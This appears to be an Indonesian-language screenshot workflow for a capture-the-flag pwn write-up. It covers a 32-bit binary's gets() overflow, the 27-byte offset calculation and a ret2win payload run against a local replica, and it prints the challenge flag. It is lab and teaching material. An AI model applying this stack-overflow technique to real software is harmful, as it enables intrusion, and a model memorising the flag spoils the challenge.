# WORKFLOW Screenshot — Queen Anne's Revenge (pwn) — Arch Linux

> Command urut dari awal sampai dapet flag, buat screenshot yang nyambung
> ke tiap `[SS: ...]` di skenario writeup.
> `[SS-x]` = momen screenshot.

---

## 0. Setup Arch (sekali doang)

```bash
# 1) Aktifin repo multilib (buat jalanin binary 32-bit):
#    edit /etc/pacman.conf, uncomment baris ini:
#      [multilib]
#      Include = /etc/mirrorlist

# 2) Install paket:
sudo pacman -Syu
sudo pacman -S socat python binutils file lib32-glibc
```

Catatan: `binutils` (objdump/readelf) & `file` biasanya udah keinstall.
Yang wajib buat binary 32-bit: **lib32-glibc**.

Bikin folder kerja:

```bash
mkdir queen && cd queen
# taruh 4 file ini di sini (dari workspace / chat):
#   chall  main.c  exploit_local.py  run_local.sh
chmod +x chall run_local.sh
```

---

## 1. Identifikasi binary — `[SS-1]`

```bash
file chall
readelf -h chall | grep -E "Type|Entry"
readelf -l chall | grep GNU_STACK
objdump -t chall | grep -E " access$| main$"
```

Yang harus keliatan:
- `ELF 32-bit LSB executable, Intel i386 ... not stripped`
- `Type: EXEC` → **no PIE**
- `080491e6 g F .text access`

---

## 2. Baca source code — `[SS-2]`

```bash
cat main.c
# atau biar bisa highlight:
nano main.c
```

Highlight baris `gets(piratename);` dan `access(pin);`. Poin:
`access()` butuh `pin==1234`, tapi cuma dipanggil dengan `pin==123`.

---

## 3. Disassembly buat hitung offset — `[SS-3]`

```bash
objdump -d -M intel chall | sed -n '/<menu>:/,/^$/p'
```

Screenshot bagian:
```asm
lea eax, [ebp-0x17]    ; gets(piratename)
lea eax, [ebp-0x1c]    ; gets(&pin)
```
Offset ke return address = `0x17 + 4` = **27 byte**.

---

## 4. Lihat exploit — `[SS-4]`

```bash
cat exploit_local.py
# highlight baris: payload = b"A"*27 + p32(ACCESS) + p32(MAIN) + p32(1234)
```

---

## 5. Nyalain server replika (terminal 1)

```bash
./run_local.sh
# output: Replika jalan di 127.0.0.1:1337 ...
```
Biarkan jalan. Buka **terminal kedua** buat langkah 6.

---

## 6. Jalanin exploit → FLAG — `[SS-5]` (paling penting)

Terminal kedua:

```bash
python3 exploit_local.py
```

Screenshot full output:
```
QUEEN ANNE'S REVENGE: Brig Treasure
ye want riches? well then,
identify yerself, ye scallywag: AAAAAAAAAAAAAAAAAAAAAAAAAAA...
hand over yer PIN: 1
Ye Landlubber! Get off me ship and be lost in the sea with them sirens!
Here be yer treasure, matey:
JCC{y4rrrr_ill_se3_y3_in_d4vy_j0n35_l0ck3r_4ye_af414429ae82}
```

---

## Kalau ada error pas langkah 6

| Error | Penyebab | Fix |
|---|---|---|
| `no such file or directory` pas jalanin chall | ld-linux 32-bit gak ada | `sudo pacman -S lib32-glibc` (pastikan multilib aktif) |
| `socat: not found` | socat belum keinstall | `sudo pacman -S socat` |
| Port 1337 keburu dipake | service lain | ganti port di `run_local.sh` (misal 1338) + `exploit_local.py` |

---

## Alternatif tanpa setup: preview web (sandbox)

Replika web masih hidup di preview **"Queen Anne's Revenge replica"**
(port 1337) → klik **Jalankan Exploit** → flag muncul di terminal web →
screenshot browser.

---

## Peta screenshot → skenario

| Di skenario | Command | Isi |
|---|---|---|
| `[SS: file + readelf]` | Langkah 1 | no PIE, alamat access |
| `[SS: main.c di editor]` | Langkah 2 | gets + kontradiksi pin |
| `[SS: objdump menu()]` | Langkah 3 | ebp-0x17 → offset 27 |
| `[SS: exploit.py]` | Langkah 4 | payload ret2win |
| `[SS: TERPENTING terminal exploit]` | Langkah 6 | flag muncul |
